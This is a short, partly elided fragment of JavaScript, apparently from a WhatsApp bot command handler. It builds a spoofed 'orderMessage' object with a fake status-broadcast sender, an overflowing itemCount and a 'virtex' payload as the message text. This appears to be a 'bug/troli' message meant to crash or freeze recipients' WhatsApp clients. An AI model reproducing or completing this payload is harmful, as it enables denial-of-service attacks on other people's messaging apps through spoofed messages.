...
let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
    ...
    try {
        ...
        let ftroli = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 9999999999999999999999999999999999999999999999999999999, status: 1, surface: 1, message: virtex, orderTitle: 'Hai', sellerJid: '0@s.whatsapp.net' } } }
